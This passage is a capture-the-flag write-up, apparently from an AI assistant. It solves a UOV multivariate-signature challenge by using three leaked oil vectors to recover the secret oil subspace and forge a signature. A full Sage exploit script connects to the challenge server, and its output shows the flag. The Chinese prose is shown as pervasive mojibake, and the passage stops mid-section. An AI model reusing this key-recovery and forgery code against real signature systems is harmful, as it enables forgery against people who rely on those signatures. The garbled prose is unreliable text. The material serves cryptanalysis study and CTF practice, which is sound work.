æ—¢ç„¶å¦‚æ­¤ï¼Œä¸å¦‚**ç›´æ¥æŒ‰è®ºæ–‡ç®—æ³• 3a è‡ªå·±åœ¨ Sage é‡Œå®ç°ä¸€é**ï¼Œå®Œå…¨ä¸ç”¨ `Attack.sage`ï¼Œè€Œä¸”åˆšå¥½é¢˜ç›®å‚æ•°å’Œæ³„éœ²æ•°é‡æ­£å¥½å¡åœ¨è®ºæ–‡é‡Œâ€œéå¸¸ä¸å¹³è¡¡â€çš„é‚£ä¸€èŠ‚ã€‚

------

## æ­£ç¡®æ€è·¯ï¼ˆå¯¹ç…§é¢˜é¢ä»£ç ä¸€æ­¥æ­¥æ¥ï¼‰

è®°ä¸€ä¸‹é¢˜ç›®å‚æ•°ï¼š

- (q = 65537)
- (n = 245)ï¼ˆå˜é‡ä¸ªæ•°ï¼‰
- (m = 50)ï¼ˆæ–¹ç¨‹ä¸ªæ•°ï¼‰
  â‡’ æ­£ç»Ÿ UOVï¼šé†‹ç»´åº¦ (v = n-m = 195)ï¼Œæ²¹ç»´åº¦ (= m = 50)

`Kitchen` ç”Ÿæˆç§é’¥æ—¶ï¼Œåœ¨**ç§˜å¯†åæ ‡**ä¸‹æ¯ä¸ªä¸­å¿ƒçŸ©é˜µæ˜¯è¿™ç§å½¢çŠ¶ï¼š

[
 S_i =
 \begin{pmatrix}
 A_i & T_i \
 T_i^T & 0
 \end{pmatrix}
 ]

- ä¸Šå·¦ (A_i)ï¼š(v\times v) éšæœºå¯¹ç§°
- å³ä¸‹æ˜¯ (m\times m) çš„**å…¨ 0 å—**ï¼ˆæ²¹â€“æ²¹å—ä¸º 0ï¼‰
- äº¤å‰å—æ˜¯ (T_i)

ç„¶åç”¨ä¸€ä¸ªéšæœºå¯é€†çŸ©é˜µ `mix` åšå˜æ¢ï¼Œå¾—åˆ°å…¬é’¥ï¼š

```python
pans = [mix_inv * s * mix_inv.transpose() for s in sauce]
```

æ²¹å­ç©ºé—´çš„æ„é€ ï¼š

```python
raw_oil = identity_matrix(F, n)[n - m :, :]
oil_done = raw_oil * mix
oil = [list(v) for v in oil_done.rows()]   # è¿™é‡Œçš„è¡Œç©ºé—´å°±æ˜¯ O
```

æ‰€ä»¥åœ¨**å…¬å¼€åæ ‡**ä¸‹ï¼Œæ²¹ç©ºé—´ (O\subset \mathbb{F}_q^n) å°±æ˜¯ `mix` çš„æœ€å `m` è¡Œå¼ æˆçš„å­ç©ºé—´ã€‚

`gather_oil` çš„æ³„éœ²é€»è¾‘æ˜¯ï¼š

```python
def leak_oil(sec):
    B = [vector(F, v) for v in sec.oil]     # è¿™å°±æ˜¯ O çš„ä¸€ç»„åŸº
    cs = [F.random_element() for _ in range(d)]
    v = vector(F, [0] * sec.n)
    for c, b in zip(cs, B):
        v += c * b                          # éšæœºçº¿æ€§ç»„åˆ => v âˆˆ O
    return [int(x) for x in v]

def gather_oil(sec, cnt):
    span = []
    r = []
    while len(r) < cnt:
        x = leak_oil(sec)
        if not insp(x, span, F):            # ä¿è¯çº¿æ€§æ— å…³
            r.append(x)
            span = rb(span + [x], F)
    return r
```

ä¹Ÿå°±æ˜¯è¯´ï¼š

> **CHOPPED é‡Œæ··è¿›äº† 3 æ¡çº¿æ€§æ— å…³çš„æ²¹å‘é‡ï¼Œå…¶ä½™ 97 æ¡çº¯éšæœºå™ªå£°ã€‚**

å¯¹ä»»æ„æ²¹å‘é‡ (x\in O)ï¼Œç”±äºç§˜å¯†åæ ‡ä¸‹æ²¹â€“æ²¹å—ä¸º 0ï¼Œæœ‰ï¼š

[
 \forall i,; x P_i x^T = 0
 ]

è€Œéšæœºå‘é‡æ»¡è¶³æ‰€æœ‰ (m=50) ä¸ªäºŒæ¬¡å‹åŒæ—¶ä¸º 0 çš„æ¦‚ç‡æ˜¯ (q^{-m}) çº§åˆ«ï¼Œå‡ ä¹ä¸å¯èƒ½ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ï¼š

1. ä» CHOPPED ä¸­ç”¨ `x P_i x^T == 0` ç­›å‡ºé‚£ 3 æ¡çœŸæ­£çš„æ²¹å‘é‡ï¼›
2. åˆ©ç”¨è¿™ 3 æ¡æ²¹å‘é‡ï¼ŒæŠŠç©ºé—´é™ç»´åˆ°ä¸€ä¸ª**95 ç»´çš„å­ç©ºé—´**ï¼Œä»ç„¶åŒ…å«æ•´æ¡æ²¹ç©ºé—´ï¼›
3. åœ¨è¿™ä¸ª 95 ç»´æ–°å®ä¾‹ä¸Šï¼Œç”¨è®ºæ–‡é‡Œâ€œå®¹æ˜“æƒ…å†µ (n'<2m)â€çš„æ ¸æ–¹æ³•ç›´æ¥çº¿ä»£æŠŠæ²¹ç©ºé—´å®Œæ•´æå‡ºæ¥ï¼›
4. æ‹¿åˆ°æ²¹ç©ºé—´åŸºåï¼Œæ„é€ å˜æ¢ (T)ï¼ŒæŠŠå…¬é’¥å˜å›ä¸­å¿ƒå½¢å¼ï¼Œå†æŒ‰ UOV çš„æ ‡å‡†ç­¾åç®—æ³•ç»™ `taste_code` åšä¸€ä»½ç­¾åï¼Œæœ€åæ˜ å›å…¬å¼€åæ ‡å‘ç»™æœåŠ¡å™¨ã€‚

è¿™ä¸ªæµç¨‹å…¶å®å°±æ˜¯è®ºæ–‡ã€ŠOne vector to rule them allã€‹é‡Œçš„ Algorithm 3a åœ¨â€œéå¸¸ä¸å¹³è¡¡â€åœºæ™¯ä¸‹çš„å¤šå‘é‡å˜ä½“ï¼š

- æˆ‘ä»¬æœ‰ (\beta=3) æ¡æ³„éœ²å‘é‡ï¼›
- åŸå‚æ•° (n=245,m=50)ï¼Œæ¯”ä¾‹ (\alpha=n/m\approx 4.9)ï¼›
- æ¯åŠ ä¸€æ¡å‘é‡ï¼Œå°±èƒ½æŠŠç©ºé—´ç»´åº¦å‡æ‰ (m)ï¼›
  å¸Œæœ›è¾¾åˆ° (n' = n-\beta m \le 2m)ï¼ˆå®¹æ˜“å®ä¾‹ï¼‰ï¼Œå³ (\beta\ge \lceil \alpha-2\rceil)ã€‚
  å¯¹ (\alpha\approx 4.9)ï¼Œåˆšå¥½éœ€è¦ (\beta=3)â€”â€”é¢˜ç›®æ­£å¥½ç»™äº† 3 æ¡ï¼Œè¿™å°±æ˜¯â€œé†‹åŠ å¤ªå¤šå•¦â€çš„å«ä¹‰ï¼šç»´åº¦éå¸¸ä¸å¹³è¡¡ï¼Œä½†åˆæ°åˆ°å¥½å¤„åœ°ç»™ä½  3 æ¡æ²¹å‘é‡æ¥æ‰“æ‰å¤šå‡ºæ¥é‚£ä¸€æˆªç»´åº¦ã€‚

------

## æ ¸å¿ƒçº¿ä»£æ­¥éª¤ï¼ˆå¯¹åº”è®ºæ–‡ç®—æ³•ï¼‰

è®°å…¬å¼€çš„çŸ©é˜µåˆ—è¡¨ (G = (G_1,\dots,G_m)) å°±æ˜¯é¢˜ç›®é‡Œçš„ `pans`ï¼Œç»´åº¦ (n\times n)ã€‚

### 1. ä» CHOPPED é‡Œç­›å‡º 3 æ¡æ²¹å‘é‡

å¯¹ CHOPPED é‡Œçš„æ¯ä¸ªå‘é‡ (v \in \mathbb{F}_q^n)ï¼Œè®¡ç®—ï¼š

[
 \forall i,\quad v G_i v^T \stackrel{?}= 0
 ]

å…¨ä¸º 0 çš„å°±æ˜¯æ²¹ç©ºé—´é‡Œçš„å‘é‡ã€‚æˆ‘ä»¬ç­›å‡º 3 ä¸ªå³å¯ã€‚

### 2. æ­å»ºâ€œJacobianâ€çŸ©é˜µå¹¶æ±‚æ ¸ï¼Œé™ç»´åˆ° 95 ç»´

æœ‰äº† 3 æ¡æ²¹å‘é‡ (\ell_1,\ell_2,\ell_3\in O)ï¼ŒæŒ‰ç…§è®ºæ–‡ä¸­çš„ (J(x)) å®šä¹‰ï¼ŒæŠŠæ¯ä¸€æ¡å‘é‡å½“ä½œâ€œè¡Œå‘é‡â€ï¼Œæ„é€ çŸ©é˜µï¼š

[
 J = \begin{pmatrix}
 \ell_1 G_1 \
 \vdots \
 \ell_1 G_m \
 \ell_2 G_1 \
 \vdots \
 \ell_2 G_m \
 \ell_3 G_1 \
 \vdots \
 \ell_3 G_m
 \end{pmatrix}
 ]

è¿™æ˜¯ä¸€ä¸ª ((\beta m)\times n = 150\times 245) çš„çŸ©é˜µã€‚
 è®ºæ–‡é‡Œ Lemma 6 æ¨å‡ºï¼šæ²¹ç©ºé—´ (O) è¢«åŒ…å«åœ¨ (\ker J) é‡Œï¼ˆæ‰€æœ‰è¿™äº›çº¿æ€§å½¢å¼çš„äº¤æ ¸ï¼‰ã€‚
 è€Œåœ¨æˆ‘ä»¬çš„å‚æ•°ä¸‹ï¼Œ(\ker J) çš„ç»´åº¦åº”è¯¥æ˜¯ï¼š

[
 \dim \ker J = n - \beta m = 245 - 3\times 50 = 95
 ]

è¿™å’Œä½ ä¹‹å‰è·‘å‡ºæ¥çš„ `dim S3 = 95` æ˜¯ä¸€å›äº‹ï¼Œå®Œå…¨ç¬¦åˆç†è®ºã€‚

è®¾ (B) æ˜¯ (\ker J) çš„åŸºçŸ©é˜µï¼Œå½¢çŠ¶ (n\times n' = 245\times 95)ï¼ˆåˆ—æ˜¯ä¸€ä¸ªåŸºï¼‰ã€‚é‚£ä¹ˆï¼š

- æ¯ä¸ªå‘é‡åœ¨æ–°åæ ‡ (t \in \mathbb{F}_q^{95}) ä¸Šè¡¨ç¤ºä¸º (x = B t)ï¼›
- æŠŠæ¯ä¸ªäºŒæ¬¡å‹é™åˆ¶åˆ°è¿™ä¸ª 95 ç»´å­ç©ºé—´ä¸Šï¼Œå¾—åˆ°ï¼š

[
 \hat{G}_i = B^T G_i B \in \mathbb{F}_q^{95\times 95}
 ]

è¿™å°±æ˜¯è®ºæ–‡ç®—æ³•ä¸­çš„ â€œ(G|_{K(x)})â€ æ­¥éª¤ã€‚

### 3. åœ¨é™ç»´åçš„ UOV å®ä¾‹ä¸­ï¼Œç”¨â€œæ ¸æ³•â€ç›´æ¥æ‰¾æ²¹ç©ºé—´

æ­¤æ—¶æˆ‘ä»¬æœ‰ä¸€ä¸ªæ–°çš„ UOV å®ä¾‹ï¼š

- å˜é‡æ•° (n' = 95)
- æ–¹ç¨‹æ•° (m = 50)
- æ²¹ç©ºé—´ç»´åº¦ä»ç„¶æ˜¯ (m = 50)

å¹¶ä¸” (n' = 95 < 2m = 100)ï¼Œè½åœ¨è®ºæ–‡é‡Œ Lemma 5 æ‰€è¯´çš„**å®¹æ˜“å®ä¾‹**èŒƒå›´ï¼š

> â€œå¦‚æœ (n' < 2m)ï¼Œå­˜åœ¨ä¸€ä¸ªç¡®å®šæ€§ç®—æ³•ï¼Œåªéœ€ä»æ¯ä¸ªçŸ©é˜µçš„æ ¸é‡ŒæŠ½å‘é‡ï¼Œå°±èƒ½é€šè¿‡çº¿ä»£æ¢å¤æ•´æ¡æ²¹ç©ºé—´å­ç©ºé—´ã€‚â€

ç›´æ¥æŒ‰ç®—æ³• 3a çš„ kernel ç‰ˆæœ¬åšï¼š

- å¯¹æ¯ä¸ª (\hat{G}_i) å–å…¶å³æ ¸ (\ker(\hat{G}_i))ï¼›
- æ”¶é›†æ‰€æœ‰è¿™äº›æ ¸é‡Œçš„å‘é‡ï¼Œåšä¸€æ¬¡â€œå¤§æ‚çƒ©â€ï¼Œåªè¦å®ƒèƒ½è®© `span` çš„ç»´åº¦å¢åŠ ï¼Œå°±åŠ å…¥é›†åˆï¼›
- é‡å¤ç›´åˆ°æ”¶é›†åˆ° (m=50) ä¸ªçº¿æ€§æ— å…³çš„å‘é‡ï¼›
- è¿™äº›å‘é‡çš„çº¿æ€§åŒ…å°±æ˜¯**é™ç»´ç©ºé—´é‡Œçš„æ²¹ç©ºé—´** (O' \subset \mathbb{F}_q^{95})ã€‚

æœ€ååšä¸€æ¬¡â€œæ‹‰å›â€ï¼š

[
 O = B \cdot O' \subset \mathbb{F}_q^{245}
 ]

ä¹Ÿå°±æ˜¯æŠŠ (O') çš„åŸºå‘é‡å½“æˆåˆ—æ‹¼æˆçŸ©é˜µ (C)ï¼Œå†ç®— (B C) å¾—åˆ°åŸç©ºé—´ä¸­çš„æ²¹ç©ºé—´åŸºã€‚

### 4. æ„é€ å˜æ¢çŸ©é˜µ (T)ï¼ŒæŠŠå…¬é’¥å˜å›ä¸­å¿ƒå½¢å¼

æ‹¿åˆ°æ²¹ç©ºé—´çš„åŸºå‘é‡ (o_1,\dots,o_m)ï¼ˆå…¨éƒ¨åœ¨åŸç©ºé—´ä¸­ï¼‰ï¼ŒæŠŠå®ƒä»¬åšæˆè¡ŒçŸ©é˜µï¼š

- (O_{\text{mat}}) æ˜¯ (m\times n) çŸ©é˜µï¼Œæ¯è¡Œæ˜¯ä¸€ä¸ªæ²¹å‘é‡ï¼›
- æ±‚ (O_{\text{mat}}) çš„å³æ ¸ï¼Œå¾—åˆ°ä¸€ä¸ª (n-m) ç»´çš„è¡¥ç©ºé—´åŸº (W)ï¼ŒæŠŠè¿™äº›åŸºå‘é‡å½“æˆè¡Œï¼Œå½¢æˆ (W_{\text{mat}})ï¼ˆ((n-m)\times n)ï¼‰ã€‚

ç„¶åæŠŠä¸¤å—æ‹¼åœ¨ä¸€èµ·ï¼š

[
 T = \begin{pmatrix}
 W_{\text{mat}} \
 O_{\text{mat}}
 \end{pmatrix}\in \mathbb{F}_q^{n\times n}
 ]

åªè¦ `rank(T) == n`ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå¯é€†çš„çº¿æ€§å˜æ¢ï¼Œä½¿å¾— **æœ€åçš„ m ä¸ªæ–°åæ ‡è½´å°±æ˜¯æ²¹ç©ºé—´**ã€‚

åœ¨è¿™ä¸ªæ–°åæ ‡ç³»ä¸‹ï¼š

[
 S_i = T G_i T^T
 ]

ä¼šå‡ºç°é¢˜ç›® `cook_form` é‚£æ ·çš„æ²¹â€“æ²¹å—å…¨ 0 çš„ç»“æ„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è¿™ä¸ªåæ ‡ä¸‹ï¼Œç³»ç»Ÿå·²ç»å˜å›äº†ä¸­å¿ƒ UOV ç»“æ„ã€‚

### 5. åœ¨ä¸­å¿ƒå½¢å¼ä¸Šè·‘ä¸€é UOV ç­¾åç®—æ³•

å¯¹ä¸­å¿ƒå½¢å¼ (S_1,\dots,S_m) å’Œæ¶ˆæ¯å‘é‡ `taste_code`ï¼š

- æŠŠæ–°åæ ‡è®°ä½œ (z = (v|;o))ï¼Œå‰ (n-m) ç»´æ˜¯ vinegarï¼Œå (m) ç»´æ˜¯ oilï¼›
- éšæœºé€‰ vinegar å‘é‡ (v\in \mathbb{F}_q^{n-m})ï¼›
- æ¯ä¸ªæ–¹ç¨‹æœ‰å½¢å¼ï¼š

[
 Q_i(z) = v^T A_i v + 2 v^T T_i o
 ]

ä»¤ï¼š

[
 c_i = v^T A_i v,\quad \text{å»ºç«‹çº¿æ€§ç³»ç»Ÿ } L \cdot o = (\text{taste_code}_i - c_i)_i
 ]

å…¶ä¸­ç¬¬ (i) è¡Œæ˜¯ (2 v^T T_i)ã€‚åªè¦ (L) ä¸ºæ»¡ç§© (m)ï¼Œå°±èƒ½è§£å‡ºå”¯ä¸€çš„æ²¹å‘é‡ (o)ã€‚

- è§£å‡º (o) ä»¥åï¼ŒæŠŠ (z = (v,o)) æ˜ å›å…¬å¼€åæ ‡ (x = z T)ï¼Œè¿™ä¸ª (x) å°±æ»¡è¶³ï¼š

[
 \forall i,\quad x G_i x^T = \text{taste_code}_i
 ]

ä¹Ÿå°±æ˜¯æœåŠ¡å™¨æ‰€è¦çš„ `dish`ã€‚

------

## å®Œæ•´ solve.sage è„šæœ¬ï¼ˆä¸å†ä¾èµ– Attack.sageï¼‰

ä¸‹é¢è¿™ä»½è„šæœ¬å°±æ˜¯æŒ‰ä¸Šé¢é‚£å¥—çº¿ä»£æ€è·¯å†™çš„ï¼Œä½ å¯ä»¥ç›´æ¥**å®Œå…¨æ›¿æ¢ä¹‹å‰çš„ solve.sage**ï¼Œä¸éœ€è¦ Attack.sage å’Œ UOV.sageï¼š

```python
#!/usr/bin/env sage -python
# -*- coding: utf-8 -*-

from sage.all import *
import socket
import random


HOST = "geek.ctfplus.cn"
PORT = "32523"


# ===========
# I/O å‡½æ•°
# ===========

def recv_header(fr):
    line = fr.readline()
    if not line:
        raise EOFError("no header line")
    q, n, m, beta = map(int, line.strip().split())
    return q, n, m, beta


def recv_pans(fr, F, n, m):
    pans = []
    for _ in range(m):
        hdr = fr.readline()
        if not hdr:
            raise EOFError("unexpected EOF when reading PAN header")
        hdr = hdr.strip()
        if not hdr.startswith("PAN"):
            raise ValueError("expected PAN header, got %r" % hdr)
        rows = []
        for _ in range(n):
            row = [F(int(x)) for x in fr.readline().split()]
            if len(row) != n:
                raise ValueError("bad matrix row length")
            rows.append(row)
        pans.append(Matrix(F, rows))
    return pans


def recv_chopped(fr):
    line = fr.readline()
    if not line:
        raise EOFError("unexpected EOF when reading CHOPPED header")
    line = line.strip()
    if not line.startswith("CHOPPED"):
        raise ValueError("expected CHOPPED header, got %r" % line)
    total = int(line.split()[1])
    vecs = []
    for _ in range(total):
        row = [int(x) for x in fr.readline().split()]
        vecs.append(row)
    return vecs


def recv_flavor(fr, F):
    line = fr.readline()
    if not line:
        raise EOFError("unexpected EOF when reading FLAVOR header")
    if line.strip() != "FLAVOR":
        raise ValueError("expected FLAVOR, got %r" % line.strip())
    vals = [F(int(x)) for x in fr.readline().split()]
    return vals


def flavor_value(P, row_vec):
    """ row_vec: 1 x n çŸ©é˜µ """
    return (row_vec * P * row_vec.transpose())[0, 0]


# ===========
# æ­¥éª¤ 1ï¼šä» CHOPPED é‡Œç­›å‡ºçœŸå®æ²¹å‘é‡
# ===========

def extract_leaks(F, pans, chopped, beta):
    n = pans[0].nrows()
    leaks = []
    for raw in chopped:
        if len(raw) != n:
            continue
        row = Matrix(F, 1, n, [F(int(x)) for x in raw])
        ok = True
        for P in pans:
            if flavor_value(P, row) != 0:
                ok = False
                break
        if ok:
            leaks.append(row[0])  # ä¿å­˜ä¸ºé•¿åº¦ n çš„å‘é‡
            if len(leaks) == beta:
                break
    if len(leaks) < beta:
        raise RuntimeError("expected %d leaks, found %d" % (beta, len(leaks)))
    return leaks


# ===========
# æ­¥éª¤ 2+3ï¼šåˆ©ç”¨å¤šæ¡æ²¹å‘é‡æ„é€  Jï¼Œé™ç»´å¹¶åœ¨æ–°å®ä¾‹ä¸­ç”¨æ ¸æ³•æ¢å¤æ²¹å­ç©ºé—´
# ===========

def recover_oil_space(F, pans, leaks, m):
    """
    pans: å…¬é’¥çŸ©é˜µåˆ—è¡¨ G_i (nÃ—n)
    leaks: è‹¥å¹²ä¸ªæ²¹å‘é‡ï¼ˆä½œä¸º F^n çš„å‘é‡ï¼‰
    è¿”å›ï¼šæ²¹ç©ºé—´ O çš„ä¸€ç»„åŸºï¼ˆåˆ—è¡¨ï¼Œæ¯ä¸ªæ˜¯ F^n å‘é‡ï¼‰
    """
    n = pans[0].nrows()
    beta = len(leaks)

    # æ„é€  Jï¼šæ¯æ¡ leakï¼Œæ¯ä¸ª P_iï¼Œè¡Œæ˜¯ leak * P_i (1Ã—n)
    rows = []
    for v in leaks:
        v_row = Matrix(F, 1, n, list(v))
        for P in pans:
            rows.append((v_row * P).list())
    J = Matrix(F, rows)      # (beta*m) Ã— n

    rankJ = J.rank()
    ker = J.right_kernel()
    basis_K = ker.basis()    # æ¯ä¸ªæ˜¯é•¿åº¦ n çš„å‘é‡

    # Bï¼šnÃ—n'ï¼Œåˆ—æ˜¯ K çš„åŸº
    B = Matrix(F, basis_K).transpose()
    nprime = B.ncols()

    print("[*] rank J =", rankJ, "dim K =", nprime)

    # å°†æ¯ä¸ª G_i é™åˆ¶åˆ° K ä¸Šï¼š Ghat_i = B^T G_i B
    Ghat = [B.transpose() * P * B for P in pans]

    # kernel approachï¼šåœ¨ F^{n'} ä¸­æ”¶é›† m ä¸ªçº¿æ€§æ— å…³çš„å‘é‡ï¼Œå½¢æˆ O' çš„åŸº
    C = Matrix(F, nprime, 0, [])  # n' Ã— 0
    for Gi in Ghat:
        ker_i = Gi.right_kernel()
        for z in ker_i.basis():
            zcol = Matrix(F, nprime, 1, list(z))
            if C.ncols() == 0:
                C = zcol
            else:
                tmp = C.augment(zcol)
                if tmp.rank() > C.rank():
                    C = tmp
            if C.ncols() == m:
                break
        if C.ncols() == m:
            break

    if C.ncols() < m:
        raise RuntimeError("could not collect full oil basis in reduced space, only %d" % C.ncols())

    # O' çš„åŸºçŸ©é˜µä¸º C (n'Ã—m)ï¼Œæ‹‰å›åˆ°åŸç©ºé—´ï¼šO_mat_cols = B * C (nÃ—m)
    O_mat_cols = B * C

    # æŠŠåˆ—å‘é‡æ‹¿å‡ºæ¥ä½œä¸ºæ²¹ç©ºé—´åŸº
    basis_O = [O_mat_cols.column(j) for j in range(O_mat_cols.ncols())]

    # ç®€å• sanity checkï¼šè¿™äº›å‘é‡åœ¨æ‰€æœ‰ G_i ä¸‹éƒ½åº”æ»¡è¶³ x^T G_i x = 0
    for idx, o in enumerate(basis_O):
        row = Matrix(F, 1, n, list(o))
        for P in pans:
            if flavor_value(P, row) != 0:
                raise RuntimeError("vector %d is not totally isotropic" % idx)

    return basis_O


# ===========
# æ„é€  Tï¼Œä½¿æœ€å m è¡Œæ˜¯æ²¹ç©ºé—´åŸº
# ===========

def build_T_from_oil_basis(F, basis_O):
    """
    basis_O: åˆ—è¡¨ï¼Œæ¯ä¸ªæ˜¯ F^n çš„å‘é‡ï¼ˆè§†ä½œåˆ—å‘é‡ï¼‰
    æ„é€ å¯é€†çŸ©é˜µ Tï¼Œä½¿å¾—æœ€å m è¡Œå¼ æˆæ²¹å­ç©ºé—´ Oã€‚
    """
    m = len(basis_O)
    n = len(basis_O[0])

    # O_matï¼šmÃ—nï¼Œè¡Œæ˜¯æ²¹å‘é‡
    O_mat = Matrix(F, [list(v) for v in basis_O])

    # è¡¥ç©ºé—´ï¼šO_mat çš„å³æ ¸ï¼Œç»´åº¦ n-m
    ker_W = O_mat.right_kernel()
    W_basis = ker_W.basis()              # æ¯ä¸ªæ˜¯é•¿åº¦ n çš„å‘é‡
    W_mat = Matrix(F, [list(w) for w in W_basis])   # (n-m)Ã—n

    # Tï¼šå…ˆè¡¥ç©ºé—´çš„è¡Œï¼Œå†æ²¹ç©ºé—´çš„è¡Œ
    T = Matrix(F, list(W_mat.rows()) + list(O_mat.rows()))  # nÃ—n
    if T.rank() != n:
        raise RuntimeError("constructed T is not invertible")
    return T


# ===========
# åœ¨ä¸­å¿ƒå½¢å¼ S_i ä¸Šåš UOV ç­¾å
# ===========

def uov_sign_from_S(F, S_list, msg):
    """
    S_list: ä¸­å¿ƒå½¢å¼çš„çŸ©é˜µåˆ—è¡¨ S_i (nÃ—n)
    msg: é•¿åº¦ m çš„ F å…ƒç´ ï¼ˆtaste_codeï¼‰
    è¿”å›ï¼šä¸­å¿ƒåæ ‡ä¸‹çš„ç­¾åå‘é‡ z âˆˆ F^n
    """
    m = len(S_list)
    n = S_list[0].nrows()
    vdim = n - m
    q = F.order()
    rnd = random.SystemRandom()

    while True:
        # éšæœº vinegar
        v_coords = [F(rnd.randrange(q)) for _ in range(vdim)]
        v_row = Matrix(F, 1, vdim, v_coords)

        L_rows = []
        rhs = []
        for i in range(m):
            Si = S_list[i]
            A = Si[:vdim, :vdim]
            Tblock = Si[:vdim, vdim:]

            c_i = (v_row * A * v_row.transpose())[0, 0]
            rhs.append(msg[i] - c_i)

            L_row_i = (F(2) * v_row * Tblock)[0]
            L_rows.append(L_row_i)

        L = Matrix(F, L_rows)  # mÃ—m
        if L.rank() < m:
            # vinegar ä¸å¥½ï¼Œé‡æ¥
            continue

        o_vec = L.solve_right(vector(F, rhs))
        z_coords = v_coords + list(o_vec)
        z = vector(F, z_coords)

        # è‡ªæ£€ä¸€ä¸‹
        z_row = Matrix(F, 1, n, z_coords)
        ok = True
        for i in range(m):
            val = (z_row * S_list[i] * z_row.transpose())[0, 0]
            if val != msg[i]:
                ok = False
                break
        if not ok:
            continue

        return z


# ===========
# ç»¼åˆæ”»å‡»é€»è¾‘
# ===========

def forge_dish(F, pans, chopped, taste_code, beta):
    n = pans[0].nrows()
    m = len(pans)

    # 1. ä» CHOPPED æå– beta æ¡æ²¹å‘é‡
    leaks = extract_leaks(F, pans, chopped, beta)
    print("[*] found %d oil leaks in CHOPPED" % len(leaks))

    # 2. åˆ©ç”¨å¤šæ¡æ²¹å‘é‡æ¢å¤å®Œæ•´æ²¹ç©ºé—´
    basis_O = recover_oil_space(F, pans, leaks, m)
    print("[*] recovered oil space dimension =", len(basis_O))

    # 3. æ„é€  Tï¼ŒæŠŠæ²¹ç©ºé—´æŒªåˆ°æœ€å m ä¸ªåæ ‡
    T = build_T_from_oil_basis(F, basis_O)
    Tt = T.transpose()

    # 4. å˜æ¢å¾—åˆ°ä¸­å¿ƒå½¢å¼çŸ©é˜µ S_i
    S_list = [T * P * Tt for P in pans]

    # 5. åœ¨ä¸­å¿ƒå½¢å¼ä¸‹å¯¹ taste_code åš UOV ç­¾å
    z = uov_sign_from_S(F, S_list, taste_code)

    # 6. æ˜ å›å…¬å¼€åæ ‡ï¼šx = z * T
    z_row = Matrix(F, 1, n, list(z))
    x_pub_row = z_row * T
    x_pub = list(x_pub_row[0])

    # è½¬æˆæ•´æ•°å½¢å¼è¿”å›
    q = F.order()
    return [int(c) % q for c in x_pub]


# ===========
# main
# ===========

def main():
    s = socket.create_connection((HOST, PORT))
    fr = s.makefile("r")
    fw = s.makefile("w")

    q, n, m, beta = recv_header(fr)
    F = GF(q)

    pans = recv_pans(fr, F, n, m)
    chopped = recv_chopped(fr)
    flavor = recv_flavor(fr, F)

    print("[*] q = %d n = %d m = %d beta = %d" % (q, n, m, beta))
    print("[*] received %d PANs and %d CHOPPED vectors" % (len(pans), len(chopped)))

    dish = forge_dish(F, pans, chopped, flavor, beta)

    # æŠŠç»“æœå‘å›å»
    fw.write(" ".join(str(x) for x in dish) + "\n")
    fw.flush()

    # æ‰“å°æœåŠ¡ç«¯å“åº”ï¼ˆåº”è¯¥å¸¦ flagï¼‰
    resp = fr.read()
    print(resp)

    s.close()


if __name__ == "__main__":
    main()

```

------

- 

```bash
(latt) âœ  ~ sage solve.sage
[*] q = 65537 n = 245 m = 50 beta = 3
[*] received 50 PANs and 100 CHOPPED vectors
[*] found 3 oil leaks in CHOPPED
[*] rank J = 150 dim K = 95
[*] recovered oil space dimension = 50
SERVE
Master Chef! You've successfully recreated this dish!
 I will pay you the flag: SYC{H31l_Chef_MVP_u_recOvereD_7he_tRue_OIL_sp@ce!}
```

è¿™ä¸ªæ–¹æ³•æœ¬è´¨ä¸Šæ˜¯â€œä¸€æ¡/å‡ æ¡æ²¹ç©ºé—´å‘é‡ + å…¬é’¥çŸ©é˜µ â‡’ æ¢å¤æ²¹ç©ºé—´ + ä¸­å¿ƒå½¢å¼ â‡’ è‡ªå·±ç­¾åâ€çš„å¥—è·¯ï¼Œæ‰€ä»¥å®ƒ**ä¸æ˜¯ä¸‡èƒ½çš„**ï¼Œåªå¯¹ä¸€ç±»æœ‰å›ºå®šç»“æ„çš„å¤šå˜é‡å…¬é’¥ç³»ç»Ÿæœ‰æ•ˆã€‚å’±ä»¬æŒ‰æ¡ä»¶æ¥æ‹†ä¸€ä¸‹ã€‚

------

## 1. è¿™ä¸ªè§£æ³•ä¾èµ–å“ªäº›ç»“æ„å‰æï¼Ÿ

ä½ çš„è„šæœ¬èƒ½æˆåŠŸï¼Œæ˜¯å› ä¸ºé¢˜ç›®æ»¡è¶³äº†ä¸€æ•´å¥—å‰ææ¡ä»¶ï¼š

### ï¼ˆ1ï¼‰ç³»ç»Ÿæ˜¯ UOV ç±»å‹çš„ MQ ç­¾å

ä¹Ÿå°±æ˜¯ï¼š

- æœ‰ (m) ä¸ªäºŒæ¬¡å‹ (Q_i(x) = x^T P_i x)ï¼Œå˜é‡æ•° (n)ï¼›

- åœ¨æŸä¸ªâ€œç§˜å¯†åæ ‡â€ä¸‹ï¼Œæ¯ä¸ªçŸ©é˜µ (S_i) å½¢çŠ¶éƒ½æ˜¯

  [
   S_i = \begin{pmatrix}
   A_i & T_i \
   T_i^T & 0
   \end{pmatrix}
   ]
   ä¸Šå·¦æ˜¯é†‹â€“é†‹å—ï¼Œä¸‹å³æ˜¯**å…¨ 0 çš„æ²¹â€“æ²¹å—**ï¼›

- å…¬å¼€å¯†é’¥æ˜¯åšè¿‡ä¸€æ¬¡éšæœºå¯é€†çº¿æ€§å˜æ¢çš„ç‰ˆæœ¬ï¼š
  [
  P_i = M^{-1} S_i M^{-T}
  ]

åªè¦æ˜¯è¿™ç§å…¸å‹ UOV ç»“æ„ï¼Œä½ çš„åŠæ³•åœ¨ç†è®ºä¸Šæ˜¯å¯ä»¥æ¬è¿‡å»çš„ï¼ˆå‚æ•°å¤§å°å½±å“çš„æ˜¯**ç®—åŠ›/æ—¶é—´**ï¼Œä¸æ˜¯å¯è¡Œæ€§ï¼‰ã€‚

> å¦‚æœä¸æ˜¯ UOVï¼Œè€Œæ˜¯ HFEã€Rainbow ä¹‹ç±»åˆ«çš„å¤šå˜é‡æ–¹æ¡ˆï¼Œå°±ä¸èƒ½ç›´æ¥ç…§æ¬è¿™ä¸ªå¥—è·¯ã€‚

------

### ï¼ˆ2ï¼‰ä½ çŸ¥é“â€œæ²¹ç©ºé—´â€å¯¹åº”çš„æ˜¯å“ªä¸ªäºŒæ¬¡å‹çš„é›¶ç©ºé—´

